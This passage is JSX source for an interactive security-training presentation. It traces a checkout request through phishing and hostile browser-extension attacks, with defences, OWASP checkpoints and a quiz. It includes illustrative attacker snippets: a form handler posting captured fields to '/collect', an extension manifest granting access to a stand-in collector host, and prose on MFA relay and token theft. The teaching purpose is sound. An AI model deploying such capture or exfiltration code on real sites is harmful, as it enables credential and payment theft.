      { title: 'Use separate client and server records.', body: 'Return a safe message and a request ID. Put redacted details in correlated logs. Define alert limits and an alert owner.', signal: 'Control: safe response and logs', result: '503 · req_7F2A', actions: ['Clear client error', 'Correlated logs', 'Alert owner'] }
    ],
    note: 'Logs are useful when related events have the same request ID. Alerts must have a defined limit and owner. Logs are also stored data. Do not put credentials or tokens in logs.'
  }
];

const quiz = [
  { question: 'Maya has a valid session. Cart cart_1043 belongs to Devon. Which control prevents access?', choices: ['Use random IDs', 'Check the user, action, and object', 'Hide the cart ID'], right: 1, why: 'The server must verify that Maya can check out cart_1043.' },
  { question: 'The risk service stops after the card charge but before the order write. Which control is required?', choices: ['Use a longer timeout', 'Use atomic writes and a safe failure policy', 'Return more error details'], right: 1, why: 'The system needs atomic or recoverable writes. It also needs a defined safe state.' },
  { question: 'A request uses TLS and valid JSON. Is the request trusted?', choices: ['Yes, because both checks passed', 'Yes, if a WAF accepts it', 'No, because these checks do not prove access or intent'], right: 2, why: 'Each component must verify the claims that it uses.' }
];

const journeyNotes = {
  'The sign-in': 'Separate the browser cookie jars aloud. In phishing, Maya submits reusable proof to the collector; an optional server-side replay may create session=s_attacker in the attacker client. In the extension path, the real shop rotates Maya’s session and sets an HttpOnly cookie. Use the storage switcher to emphasize that JWT is a format—storage and attachment define XSS and CSRF exposure.',
  'Under the hood': 'Open each envelope. Collector and replay are separate requests; only replay reaches the shop. In the extension path, Request A passes authentication and CSRF but contains an attacker-chosen recipient. Request B is independent exfiltration through the extension worker. Ask which server invariant failed.',
  'The privilege gap': 'Use the four tabs to prevent vocabulary collapse. Phishing defeats human origin verification; CSRF abuses ambient credentials; XSS runs in the trusted origin; the extension exercises an installed capability grant. Read “actually bypassed” and “not bypassed” together.'
};
const journeyScenes = journeyBeats.map((item, index) => ({ ...item, type: 'journey', zone: `journey-${index + 1}`, minutes: item.label === 'The sign-in' || item.label === 'The privilege gap' ? 2.5 : 1.5, note: journeyNotes[item.label] || `Let the ${item.label.toLowerCase()} visual complete before explaining it. Point to the colored route or highlighted object first; use the evidence chips only to confirm what the audience has already seen.` }));
const scenes = [
  { type: 'opening', section: 'journey', label: 'Case open', zone: 'open', time: 'before the click', minutes: 1.5, note: 'Open with the central question: “When Maya clicks Pay, whose code receives her intent?” Let the audience choose which compromise path to trace first.' },
  { type: 'recon', section: 'journey', label: 'Recon workbench', zone: 'recon', time: 'T − 24 h', minutes: 4, note: 'Let the room choose commands. Each result is simulated and intentionally harmless: the point is how small public clues compose into an attack plan. After three clues, ask which exposure they would fix first—and which one is merely information, not a vulnerability by itself.' },
  ...journeyScenes.map(item => ({ ...item, section: 'journey' })),
  { type: 'bridge', section: 'reflections', label: 'What we learned', zone: 'reflect', time: 'rewind complete', minutes: 1.5, note: 'The audience has seen the incident. The next scenes follow the request through eight system boundaries. At each boundary, identify the claim, the attack, and the control.' },
  ...checkpoints.map(item => ({ ...item, type: 'checkpoint', section: 'reflections' })),
  { type: 'quiz', section: 'reflections', label: 'Field test', zone: 'replay', time: 'replay', minutes: 3, note: 'Ask the audience to vote before you select an answer. Ask them to explain the reason. First, find the boundary. Then identify the claim and select the control.' },
  { type: 'closing', section: 'reflections', label: 'Case closed', zone: 'closed', time: 'complete', minutes: 2, note: 'Review the five questions. Ask each person to select one production request this week. Ask their team to draw each boundary and its verification step.' }
];
const reflectionStartIndex = scenes.findIndex(item => item.type === 'bridge');

function formatClock(seconds) {
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
}

function LensBadges({ lenses = [] }) {
  return <div className="lens-badges" role="group" aria-label="OWASP categories">{lenses.map(code => <span key={code}>{code} <small>{owasp[code][0]}</small></span>)}</div>;
}

function RouteLine({ zone }) {
  return (
    <div className="route-line" role="img" aria-label={`Request route, current checkpoint ${zone}`}>
      {route.map((stop, index) => (
        <div className={`route-stop ${stop === zone ? 'is-current' : ''} ${route.indexOf(zone) > index ? 'is-past' : ''}`} key={stop}>
          <i aria-hidden="true" /><span>{stop}</span>
        </div>
      ))}
      <span className="route-packet" style={{ '--route-index': Math.max(0, route.indexOf(zone)) }} aria-hidden="true" />
    </div>
  );
}

function PacketFact({ line, phase, index, className = '' }) {
  const hot = index === phase + 1 || (phase === 2 && index === 4);
  return (
    <div className={`packet-line ${hot ? 'is-hot' : ''} ${className}`}>
      <span>{line.label}</span><code>{line.values[phase]}</code>
    </div>
  );
}

function CheckpointVisual({ scene, phase }) {
  const facts = scene.packet;
  const fact = index => <PacketFact key={facts[index].label} line={facts[index]} phase={phase} index={index} />;

  if (scene.zone === 'browser') return (
    <div className="checkpoint-visual browser-testimony" role="group" aria-label="Values in the browser request">
      <div className="request-stamp"><span>REQUEST</span><strong>POST</strong><small>Verify each value</small></div>
      <div className="testimony-fields">{facts.map((_, index) => fact(index))}</div>
    </div>
  );

  if (scene.zone === 'edge') return (
    <div className="checkpoint-visual edge-gates" role="group" aria-label="Edge policy gates">
      {facts.map((_, index) => <div className="edge-gate" key={facts[index].label}><i>0{index + 1}</i>{fact(index)}<b aria-hidden="true">→</b></div>)}
    </div>
  );

  if (scene.zone === 'api') return (
    <div className="checkpoint-visual auth-decision" role="group" aria-label="Authorization decision">
      <div className="auth-equation">{[0, 1, 2].map((index, position) => <div key={facts[index].label}>{fact(index)}{position < 2 && <b aria-hidden="true">+</b>}</div>)}</div>
      <div className="ownership-check">{fact(3)}<span aria-hidden="true">≟</span>{fact(4)}</div>
    </div>
  );

  if (scene.zone === 'parser') return (
    <div className="checkpoint-visual parser-console" role="group" aria-label="Parser and query boundary">
      <div className="parser-input"><span>UNTRUSTED INPUT</span>{fact(0)}{fact(2)}</div>
      <div className="parser-arrow" aria-hidden="true"><i>DATA</i><b>→</b><i>CODE?</i></div>
      <div className="query-output"><span>INTERPRETER</span>{fact(1)}<div>{fact(3)}{fact(4)}</div></div>
    </div>
  );

  if (scene.zone === 'logic') return (
    <div className="checkpoint-visual logic-ledger" role="group" aria-label="Business logic ledger">
      <div className="ledger-item">{fact(0)}{fact(1)}</div>
      <div className="ledger-totals"><span>WHO OWNS THE TOTAL?</span>{fact(2)}<b aria-hidden="true">↔</b>{fact(3)}</div>
      <div className="ledger-replay">{fact(4)}</div>
    </div>
  );

  if (scene.zone === 'data') return (
    <div className="checkpoint-visual privilege-map" role="group" aria-label="Database role and permitted access">
      <div className="privilege-core">{fact(0)}<span>PERMITTED<br />ACCESS</span></div>
      <div className="privilege-spokes">{[1, 2, 3, 4].map(index => fact(index))}</div>
    </div>
  );

  if (scene.zone === 'failure') return (
    <div className="checkpoint-visual failure-flow" role="group" aria-label="Exceptional condition state flow">
      {[0, 1, 3, 4].map((index, position) => <div className="failure-step" key={facts[index].label}>{fact(index)}{position < 3 && <b aria-hidden="true">→</b>}</div>)}
      <div className="retry-loop">↻ {fact(2)}</div>
    </div>
  );

  return (
    <div className="checkpoint-visual return-contracts" role="group" aria-label="Public response and private evidence contracts">
      <div><span>PUBLIC CONTRACT</span>{fact(0)}{fact(1)}{fact(2)}</div>
      <i aria-hidden="true">≠</i>
      <div><span>PRIVATE EVIDENCE</span>{fact(3)}{fact(4)}</div>
    </div>
  );
}

function RequestLab({ scene, phase, setPhase }) {
  const beat = scene.phases[phase];
  return (
    <div className={`request-lab lab-${scene.zone} phase-${phase}`}>
      <div className="lab-header">
        <span>{scene.zone === 'return' ? 'RESPONSE' : 'LIVE REQUEST'} · req_7F2A</span>
        <strong>{scene.time}</strong>
      </div>
      <RouteLine zone={scene.zone} />
      <div className="lab-workspace">
        <CheckpointVisual scene={scene} phase={phase} />
        <div className="beat-card" aria-live="polite">
          <div className="beat-meta"><span>{beat.signal}</span><strong>{beat.result}</strong></div>
          <h3>{beat.title}</h3>
          <p>{beat.body}</p>
          {beat.actions && <div className="control-chips">{beat.actions.map(action => <span key={action}>✓ {action}</span>)}</div>}
        </div>
      </div>
      <div className="phase-tabs" role="group" aria-label="Security reveal stages">
        {phaseLabels.map((label, index) => (
          <button type="button" key={label} className={phase === index ? 'is-selected' : ''} aria-pressed={phase === index} onClick={() => setPhase(index)}>
            <span>0{index + 1}</span>{label}
          </button>
        ))}
      </div>
    </div>
  );
}

function PathSwitch({ branch, setBranch, compact = false }) {
  return (
    <div className={`path-switch ${compact ? 'is-compact' : ''}`} role="group" aria-label="Choose compromise path">
      {Object.entries(compromisePaths).map(([key, path]) => (
        <button type="button" key={key} className={branch === key ? 'is-selected' : ''} aria-pressed={branch === key} onClick={() => setBranch(key)}>
          <span>{path.label}</span>{!compact && <small>{path.description}</small>}
        </button>
      ))}
    </div>
  );
}

function Opening({ next, branch, setBranch }) {
  return (
    <section className="scene-shell opening-scene" aria-labelledby="opening-title">
      <div className="opening-copy">
        <p className="scene-kicker">Checkout incident · Maya clicks Pay</p>
        <h1 id="opening-title">Follow one<span>.</span><br />checkout request.</h1>
        <p className="opening-lede">Maya wants to pay RM129. <strong>An attacker changes what happens after she clicks Pay.</strong></p>
        <p className="opening-thesis">Select the phishing path or the browser extension path. The presentation shows what Maya, the browser, and the attacker do.</p>
        <PathSwitch branch={branch} setBranch={setBranch} />
        <button className="primary-action" type="button" onClick={next}>Start the incident <span aria-hidden="true">→</span></button>
      </div>
      <div className="opening-visual opening-diorama" role="img" aria-label="A checkout page whose Pay button sends data along a compromised route">
        <div className="case-label"><span>LIVE INCIDENT · req_7F2A</span><strong>{compromisePaths[branch].short.toUpperCase()}</strong></div>
        <BrowserWindow branch={branch} />
        <div className="opening-route-preview">
          <span><i>M</i>Maya’s browser</span><b>→</b>
          <span className="is-destination"><i>A</i>{branch === 'phishing' ? 'Attacker collector' : 'Shop + extension collector'}</span>
        </div>
      </div>
    </section>
  );
}

function ReconWorkbench({ next }) {
  const reduceMotion = useReducedMotion();
  const [activeId, setActiveId] = useState(null);
  const [explored, setExplored] = useState([]);
  const active = reconCommands.find(item => item.id === activeId);

  function runCommand(item) {
    setActiveId(item.id);
    setExplored(current => current.includes(item.id) ? current : [...current, item.id]);
  }

  return (
    <section className="scene-shell recon-scene" aria-labelledby="recon-title">
      <div className="recon-heading">
        <div>
          <div className="scene-index"><span>Background · attacker preparation</span><strong>T − 24 h</strong></div>
          <h2 id="recon-title">The attacker collects public information.</h2>
        </div>
        <p>The attacker reviews public files, routes, and error messages. This information helps the attacker select the next test.</p>
      </div>

      <div className="recon-workbench">
        <div className="command-drawer" role="group" aria-label="Recon commands">
          <div className="drawer-heading"><span>CHOOSE AN EXPERIMENT</span><strong>{explored.length} / {reconCommands.length} clues</strong></div>
          {reconCommands.map((item, index) => {
            const locked = item.id === 'map-read' && !explored.includes('map-download');
            const seen = explored.includes(item.id);
            return (
              <button type="button" key={item.id} className={activeId === item.id ? 'is-active' : seen ? 'is-seen' : ''} aria-pressed={activeId === item.id} disabled={locked} onClick={() => runCommand(item)}>
                <span>{String(index + 1).padStart(2, '0')} · {item.label}</span>
                <code><b>$</b> {locked ? 'fetch main.js.map first' : item.command}</code>
                <i aria-hidden="true">{locked ? 'LOCKED' : seen ? '✓ FOUND' : 'RUN ↵'}</i>
              </button>
            );
          })}
        </div>

        <div className="recon-terminal" aria-live="polite">
          <div className="terminal-bar"><span><i /> <i /> <i /></span><strong>scout@field-kit</strong><small>{active ? active.tool.toUpperCase() : 'READY'}</small></div>
          <AnimatePresence mode="wait" initial={false}>
            {active ? (
              <motion.div className="terminal-session" key={active.id} initial={reduceMotion ? false : { opacity: 0, transform: 'translateY(6px)' }} animate={{ opacity: 1, transform: 'translateY(0)' }} exit={{ opacity: 0 }} transition={{ duration: .2, ease: [.23, 1, .32, 1] }}>
                <code className="terminal-command"><b>$</b> {active.command}</code>
                <pre>{active.output.map((line, index) => <span key={`${line}-${index}`}>{line || '\u00A0'}</span>)}</pre>
                <div className="clue-stamp"><span>CLUE FOUND</span><strong>{active.clue}</strong></div>
              </motion.div>
            ) : (
              <motion.div className="terminal-empty" key="empty" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                <span>FIELD KIT READY</span><strong>Pick a command to examine the public surface.</strong><p>No live requests are made. This is a simulated, intentionally harmless lab.</p>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        <aside className={`recon-brief ${active ? 'has-clue' : ''}`} aria-label="Recon explanation">
          {active ? <AnimatePresence mode="wait" initial={false}><motion.div key={active.id} initial={reduceMotion ? false : { opacity: 0, transform: 'translateX(7px)' }} animate={{ opacity: 1, transform: 'translateX(0)' }} exit={{ opacity: 0 }} transition={{ duration: .2, ease: [.23, 1, .32, 1] }}>
            <span>WHY IT MATTERS</span><p>{active.meaning}</p>
            <span className="defender-label">DEFENDER MOVE</span><p>{active.defend}</p>
          </motion.div></AnimatePresence> : <div><span>THE METHOD</span><p>Observe → define a possible cause → run a small safe test → record the result.</p><small>Exposed information is not always a vulnerability. Multiple details can help an attacker find a vulnerability.</small></div>}
        </aside>
      </div>
      <div className="recon-footer"><span>PUBLIC CLUES</span><i>→</i><span>ATTACKER HYPOTHESIS</span><i>→</i><span>FOCUSED EXPERIMENT</span><strong>{explored.length === reconCommands.length ? 'MAP COMPLETE ✓' : 'BUILD THE MAP'}</strong><button type="button" onClick={next}>Begin incident →</button></div>
    </section>
  );
}

function CausalThread({ path, progress, reduceMotion }) {
  return (
    <div className="causal-thread" style={{ '--journey-step-count': path.steps.length }} role="group" aria-label={`${path.short} journey progress: ${path.steps[progress]}`}>
      {path.steps.map((step, index) => (
        <div className={`causal-step ${index < progress ? 'is-past' : ''} ${index === progress ? 'is-current' : ''}`} key={step}>
          <span>{String(index + 1).padStart(2, '0')}</span><strong>{step}</strong>
          {index === progress && <motion.i layoutId="journey-playhead" transition={reduceMotion ? { duration: 0 } : { type: 'spring', duration: .5, bounce: .1 }} />}
        </div>
      ))}
    </div>
  );
}

function VisualEvidence({ items, reduceMotion }) {
  return (
    <div className="visual-evidence" role="group" aria-label="Evidence at this moment">
      {items.map(([label, value, source], index) => (
        <motion.div className={`visual-evidence-item source-${source}`} key={`${label}-${value}`}
          initial={reduceMotion ? false : { opacity: 0, transform: 'translateY(6px)' }}
          animate={{ opacity: 1, transform: 'translateY(0px)' }}
          transition={{ duration: .32, delay: reduceMotion ? 0 : .18 + index * .06, ease: [.23, 1, .32, 1] }}>
          <small>{label}</small><strong>{value}</strong>
        </motion.div>
      ))}
    </div>
  );
}

function BrowserWindow({ branch, view = 'checkout', interactive = false, onPay, playKey = 0, inspector = false, actualSite = false }) {
  const phishing = branch === 'phishing' && !actualSite;
  const extension = branch === 'extension' && !actualSite;
  return (
    <div className={`demo-browser ${phishing ? 'is-phishing' : extension ? 'is-extension' : 'is-actual-site'} ${inspector ? 'has-inspector' : ''}`}>
      <div className="demo-browser-chrome">
        <i /><i /><i />
        <div className="demo-address"><span>⌁</span><strong>{phishing ? 'shop-example.help' : 'shop.example'}</strong><em>{phishing ? 'LOOKALIKE ORIGIN' : 'VERIFIED ORIGIN'}</em></div>
        {extension && <b className="extension-badge">EXT <span>1</span></b>}
      </div>
      <div className="demo-shop-header"><b>NORTHSTAR</b><span>Bag · 1</span></div>
      {view === 'login' ? (
        <div className="demo-login">
          <span>{phishing ? 'SESSION EXPIRED' : 'WELCOME BACK'}</span>
          <h3>Sign in to continue</h3>
          <label>Email<input tabIndex={-1} readOnly value="maya@example.com" /></label>
          <label>Password<input tabIndex={-1} readOnly value="••••••••••••" /></label>
          <button type="button" tabIndex={-1}>Sign in <i>→</i></button>
          <code>{phishing ? 'POST /collect/login' : 'POST /session'}</code>
        </div>
      ) : view === 'receipt' ? (
        <motion.div className={`demo-receipt ${phishing ? 'is-fake' : ''}`} initial={{ opacity: 0, transform: 'scale(.96)' }} animate={{ opacity: 1, transform: 'scale(1)' }} transition={{ duration: .4, ease: [.23, 1, .32, 1] }}>
          <i>✓</i><span>{phishing ? 'LOCAL PAGE STATE' : 'SHOP RESPONSE · 200'}</span><h3>Payment received</h3>
          <p>{phishing ? 'We’ll email your order details shortly.' : 'Order ord_8821 is confirmed.'}</p>
          <code>{phishing ? 'trusted order ID: —' : 'receipt.shop.example/ord_8821'}</code>
        </motion.div>
      ) : (
        <div className="demo-checkout">
          <div className="demo-product"><i>NS</i><div><strong>Security field course</strong><span>Digital access · 1 seat</span></div><b>RM129</b></div>
          <div className="demo-delivery"><span>Delivery account</span><strong>{inspector && !phishing ? 'drop_772' : 'maya@home'}</strong>{inspector && !phishing && <em>CHANGED LOCALLY</em>}</div>
          <div className="demo-total"><span>Total</span><strong>RM129.00</strong></div>
          <motion.button key={playKey} className="demo-pay" type="button" tabIndex={interactive ? 0 : -1} aria-label={interactive ? 'Replay Maya clicking Pay now' : undefined} aria-hidden={!interactive}
            onClick={interactive ? onPay : undefined}
            animate={playKey ? { transform: ['scale(1)', 'scale(.96)', 'scale(1)'] } : { transform: 'scale(1)' }}
            transition={{ duration: .42, delay: .22, ease: [.23, 1, .32, 1] }}>
            Pay now <span>→</span>
          </motion.button>
        </div>
      )}
      {inspector && <div className="browser-xray"><span>{phishing ? 'onclick handler' : 'isolated content script'}</span><code>{phishing ? "fetch('/collect', { method: 'POST', body: new FormData(form) })" : "form.elements.account.value = 'drop_772'"}</code></div>}
    </div>
  );
}

function PhishingLayerStack({ view = 'checkout', interactive = false, onPay, playKey = 0, inspector = false }) {
  return (
    <div className="phishing-layer-stack" aria-label="The phishing page layered over the real shop.">
      <div className="phishing-layer-base" aria-hidden="true">
        <span className="layer-badge"><b>02</b> UPSTREAM · REAL SITE</span>
        <BrowserWindow branch="phishing" view={view} actualSite />
      </div>
      <div className="phishing-layer-top">
        <span className="layer-badge"><b>01</b> PHISHING PROXY · READS FIRST</span>
        <BrowserWindow branch="phishing" view={view} interactive={interactive} onPay={onPay} playKey={playKey} inspector={inspector} />
      </div>
    </div>
  );
}

function JourneyBrowser({ branch, reduceMotion, ...props }) {
  return branch === 'phishing'
    ? <PhishingLayerStack reduceMotion={reduceMotion} {...props} />
    : <BrowserWindow branch={branch} {...props} />;
}

function DiagramNode({ x, y, tone = 'neutral', label, detail }) {
  return (
    <g className={`diagram-node tone-${tone}`} transform={`translate(${x} ${y})`}>
      <rect x="-72" y="-34" width="144" height="68" rx="2" />
      <circle cx="-50" cy="0" r="12" />
      <text className="node-label" x="-29" y="-4">{label}</text>
      <text className="node-detail" x="-29" y="13">{detail}</text>
    </g>
  );
}

function RequestMap({ branch, phase = 'click', run = 1, reduceMotion = false }) {
  const phishing = branch === 'phishing';
  const relay = phase === 'relay';
  const duration = reduceMotion ? 0 : .9;
  return (
    <svg className="request-map" viewBox="0 0 1000 340" role="img" aria-label={phishing ? 'The browser sends the checkout data to the attacker backend instead of the shop' : 'The browser sends one request to the real shop while the extension sends copied data to the attacker'}>
      <defs>
        <marker id="arrow-attack" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="var(--attack)" /></marker>
        <marker id="arrow-safe" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="var(--secure)" /></marker>
        <marker id="arrow-extension" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="var(--extension)" /></marker>
      </defs>
      <path className="map-grid" d="M60 170 H940 M500 36 V304" />
      <DiagramNode x={145} y={170} tone="maya" label="MAYA’S BROWSER" detail={phishing ? 'shop-example.help' : 'shop.example + EXT'} />
      <DiagramNode x={855} y={86} tone="secure" label="ACTUAL SHOP" detail="shop.example/api" />
      <DiagramNode x={855} y={254} tone={phishing ? 'attack' : 'extension'} label={phishing ? (relay ? 'COLLECTOR + REPLAY' : 'ATTACKER COLLECTOR') : 'ATTACKER COLLECTOR'} detail={phishing ? 'shop-example.help' : 'collector.invalid'} />

      {phishing ? (
        <>
          <path className="route-ghost" d="M217 154 C440 55 615 55 782 82" />
          <motion.path key={`attack-${run}`} className="route-attack" d="M217 182 C430 270 600 278 782 257" markerEnd="url(#arrow-attack)"
            initial={{ pathLength: reduceMotion ? 1 : 0 }} animate={{ pathLength: 1 }} transition={{ duration, ease: 'easeInOut' }} />
          <motion.circle key={`packet-${run}`} className="packet-attack" r="7" initial={{ opacity: 0, cx: 217, cy: 182 }}
            animate={{ opacity: [0, 1, 1, 0], cx: [217, 380, 610, 782], cy: [182, 238, 275, 257] }} transition={{ duration, delay: reduceMotion ? 0 : .18, ease: 'easeInOut' }} />
          <text className="route-label attack-label" x="425" y="278">POST /collect · form fields</text>
          <text className="route-label ghost-label" x="438" y="76">expected route · never used</text>
          {relay && <>
            <motion.path key={`relay-${run}`} className="route-relay" d="M855 220 C815 168 815 135 855 120" markerEnd="url(#arrow-safe)"
              initial={{ pathLength: reduceMotion ? 1 : 0 }} animate={{ pathLength: 1 }} transition={{ duration: duration * .65, delay: reduceMotion ? 0 : .82, ease: 'easeInOut' }} />
            <text className="route-label relay-label" x="625" y="170">server replay · new attacker session</text>
          </>}
        </>
      ) : (
        <>
          <motion.path key={`safe-${run}`} className="route-safe" d="M217 154 C440 55 615 55 782 82" markerEnd="url(#arrow-safe)"
            initial={{ pathLength: reduceMotion ? 1 : 0 }} animate={{ pathLength: 1 }} transition={{ duration, ease: 'easeInOut' }} />
          <motion.path key={`ext-${run}`} className="route-extension" d="M217 182 C430 270 600 278 782 257" markerEnd="url(#arrow-extension)"
            initial={{ pathLength: reduceMotion ? 1 : 0 }} animate={{ pathLength: 1 }} transition={{ duration, delay: reduceMotion ? 0 : .14, ease: 'easeInOut' }} />
          <motion.circle key={`safe-packet-${run}`} className="packet-safe" r="7" initial={{ opacity: 0, cx: 217, cy: 154 }}
            animate={{ opacity: [0, 1, 1, 0], cx: [217, 400, 620, 782], cy: [154, 88, 62, 82] }} transition={{ duration, delay: reduceMotion ? 0 : .18, ease: 'easeInOut' }} />
          <motion.circle key={`ext-packet-${run}`} className="packet-extension" r="7" initial={{ opacity: 0, cx: 217, cy: 182 }}
            animate={{ opacity: [0, 1, 1, 0], cx: [217, 380, 610, 782], cy: [182, 238, 275, 257] }} transition={{ duration, delay: reduceMotion ? 0 : .34, ease: 'easeInOut' }} />
          <text className="route-label safe-label" x="392" y="73">A · checkout · session + CSRF pass</text>
          <text className="route-label extension-label" x="382" y="282">B · worker fetch · DOM fields copied</text>
        </>
      )}
    </svg>
  );
}

function SetupVisual({ branch, reduceMotion }) {
  const phishing = branch === 'phishing';
  return (
    <div className="visual-stage setup-visual">
      <div className="attacker-workbench">
        <div className="workbench-top"><span>ATTACKER WORKSPACE</span><strong>{phishing ? 'lookalike-kit/' : 'parcel-price-finder/'}</strong><i>● LIVE</i></div>
        <div className="workbench-body">
          <div className="code-gutter">01<br />02<br />03<br />04<br />05</div>
          <code>{phishing ? <><span>&lt;form action=</span><b>"/collect"</b><span>&gt;</span><br /><span> clone(</span><em>"shop checkout"</em><span>)</span><br /><span> onPay(</span><b>capture</b><span>)</span><br /><span> show(</span><em>"Payment received"</em><span>)</span><br /><strong> deploy → shop-example.help</strong></> : <><span>"content_scripts.matches": [</span><b>"*://shop.example/*"</b><span>]</span><br /><span>"host_permissions": [</span><b>"https://collector.invalid/*"</b><span>]</span><br /><span>if (path === </span><em>"/checkout"</em><span>)</span><br /><span> runtime.sendMessage(</span><b>snapshot</b><span>)</span><br /><strong> MV3 worker → collector</strong></>}</code>
        </div>
      </div>
      <motion.div className={`deploy-preview ${phishing ? 'preview-site' : 'preview-extension'}`}
        initial={reduceMotion ? false : { opacity: 0, transform: 'translateX(18px) scale(.97)' }} animate={{ opacity: 1, transform: 'translateX(0px) scale(1)' }} transition={{ duration: .5, delay: .16, ease: [.23, 1, .32, 1] }}>
        <span>{phishing ? 'DEPLOYED SURFACE' : 'STORE LISTING'}</span>
        {phishing ? <><div className="mini-shop"><b>NORTHSTAR</b><i>Checkout</i><strong>RM129.00</strong><button type="button" tabIndex="-1">Pay now</button></div><code>shop-example.help</code></> : <><div className="extension-card"><i>↯</i><div><b>Parcel Price Finder</b><span>Automatic delivery discounts</span><em>★★★★★ · 24K users</em></div></div><code>Can read and change shop.example</code></>}
      </motion.div>
      <div className="visual-callout"><span>ATTACKER’S MOVE</span><strong>{phishing ? 'Copy the pixels. Change the destination.' : 'Hide broad access inside a useful tool.'}</strong></div>
    </div>
  );
}

const credentialModels = {
  cookie: { label: 'Opaque HttpOnly cookie', shortLabel: 'Session cookie', storage: 'HttpOnly cookie jar' },
  jwtCookie: { label: 'JWT in HttpOnly cookie', shortLabel: 'JWT cookie', storage: 'HttpOnly cookie jar' },
  bearer: { label: 'Bearer JWT in localStorage', shortLabel: 'localStorage JWT', storage: 'localStorage' }
};

function getCredentialFlow(branch, model) {
  const phishing = branch === 'phishing';
  const bearer = model === 'bearer';
  const jwt = model === 'jwtCookie';
  const tokenName = bearer ? 'bearer JWT' : jwt ? 'JWT cookie' : 'session ID';

  if (phishing) {
    return {
      tone: 'danger',
      scenes: [
        { label: 'Fake prompt', actor: 'MAYA’S BROWSER · shop-example.help', title: 'A sign-in modal appears on the phishing site.', body: 'It only looks like the shop. Maya’s password is submitted to the attacker origin—not to shop.example.', visual: 'password' },
        { label: 'Relay login', actor: 'ATTACKER SERVER → shop.example', title: 'The attacker starts a second, real login.', body: 'Using Maya’s password, the attacker’s server or automated browser sends its own request to the real shop. The shop replies to the attacker with an MFA challenge.', visual: 'relay' },
        { label: 'Live MFA', actor: 'ATTACKER SERVER ↔ MAYA', title: 'The challenge is copied back into the fake modal.', body: 'Maya enters the current code. The attacker forwards it immediately to the real shop before it expires.', visual: 'mfa' },
        { label: 'Session owned', actor: 'shop.example → ATTACKER HTTP CLIENT', title: bearer ? 'The real shop returns a bearer token to the attacker.' : `The real shop returns a Set-Cookie header to the attacker.`, body: bearer
          ? 'Because the attacker made the successful login request, its client receives and stores the bearer JWT. Maya’s browser never receives this token.'
          : `Because the attacker—not Maya’s browser—made the real login request, the response goes back to the attacker’s HTTP client. Its server-side cookie jar saves “${tokenName}=…“ for shop.example. This does not place a shop cookie on the phishing origin.`, visual: 'cookie' },
        { label: 'Impersonation', actor: 'ATTACKER HTTP CLIENT → shop.example', title: 'The attacker can now act as Maya.', body: bearer
          ? 'The attacker sends Authorization: Bearer … from any client. The shop sees a valid authenticated session even though Maya never approved these later actions.'
          : `On later requests, the attacker’s HTTP client attaches its stored ${tokenName} to shop.example. The shop sees a valid authenticated session controlled entirely by the attacker. That enables account access, purchases, or data theft as Maya.`, visual: 'impact' }
      ],
      facts: [['!', 'Password + MFA relayed', 'danger'], ['→', 'Attacker owns new session', 'danger'], ['✓', 'Maya cookie not copied', 'safe']]
    };
  }

  if (bearer) {
    return {
      tone: 'danger',
      scenes: [
        { label: 'Real prompt', actor: 'MAYA · shop.example', title: 'Maya signs in to the real shop.', body: 'The shop verifies her password and MFA normally.', visual: 'password' },
        { label: 'Token stored', actor: 'SHOP RESPONSE → MAYA’S BROWSER', title: 'The app stores its bearer JWT in localStorage.', body: 'The token is reusable proof of Maya’s session and is readable by code with access to the page.', visual: 'cookie' },
        { label: 'Token copied', actor: 'HOSTILE EXTENSION → COLLECTOR', title: 'The extension reads and exfiltrates the token.', body: 'Unlike an HttpOnly cookie, the token value can be copied out of the browser.', visual: 'relay' },
        { label: 'Off-device replay', actor: 'ATTACKER CLIENT → shop.example', title: 'The attacker replays it anywhere.', body: 'Authorization: Bearer … gives the attacker Maya’s authenticated authority until the token expires or is revoked.', visual: 'impact' }
      ],
      facts: [['!', 'Token value exposed', 'danger'], ['→', 'Off-device replay', 'danger'], ['—', 'Not ambient CSRF', 'safe']]
    };
  }

  return {
    tone: 'warning',
    scenes: [
      { label: 'Real prompt', actor: 'MAYA · shop.example', title: 'Maya signs in to the real shop.', body: 'The shop verifies her password and MFA normally.', visual: 'password' },
      { label: 'Cookie stored', actor: 'SHOP RESPONSE → MAYA’S BROWSER', title: `The browser stores the ${tokenName}.`, body: 'HttpOnly prevents page and extension content scripts from reading the credential value.', visual: 'cookie' },
      { label: 'Read blocked', actor: 'HOSTILE EXTENSION · PAGE CONTEXT', title: 'The extension cannot copy the token.', body: 'Cookie secrecy still holds. But the authenticated page remains available to hostile local code.', visual: 'blocked' },
      { label: 'Session ridden', actor: 'MAYA’S BROWSER → shop.example', title: 'The extension triggers or changes a shop request.', body: `The browser automatically attaches the ${tokenName}. The attacker gains an authenticated action without ever learning the token string.`, visual: 'impact' }
    ],
    facts: [['✓', 'Token unreadable', 'safe'], ['!', 'Session rideable', 'warning'], ['→', 'Shop receives authority', 'warning']]
  };
}

function CredentialFlow({ branch, model, reduceMotion }) {
  const flow = getCredentialFlow(branch, model);
  const [step, setStep] = useState(0);
  const scene = flow.scenes[step];

  useEffect(() => {
    setStep(0);
  }, [branch, model]);

  return (
    <motion.div id="credential-flow-panel" role="tabpanel" className={`credential-story is-${flow.tone}`}
      key={`${branch}-${model}`} initial={false} animate={{ opacity: 1 }}>
      <div className="credential-story-rail" role="tablist" aria-label={`${credentialModels[model].label} attack sequence`}>
        {flow.scenes.map((item, index) => <button type="button" role="tab" aria-selected={step === index} className={step === index ? 'is-current' : step > index ? 'is-past' : ''} key={item.label} onClick={() => setStep(index)}><span>0{index + 1}</span><strong>{item.label}</strong></button>)}
      </div>
      <div className="credential-story-stage">
        <div className="credential-story-scene">
          <div className={`auth-story-visual visual-${scene.visual}`}>
            <div className="auth-site-bar"><i /><i /><i /><code>{branch === 'phishing' && step === 0 ? 'shop-example.help' : scene.actor}</code></div>
            {(scene.visual === 'password' || scene.visual === 'mfa') ? <div className="auth-popup">
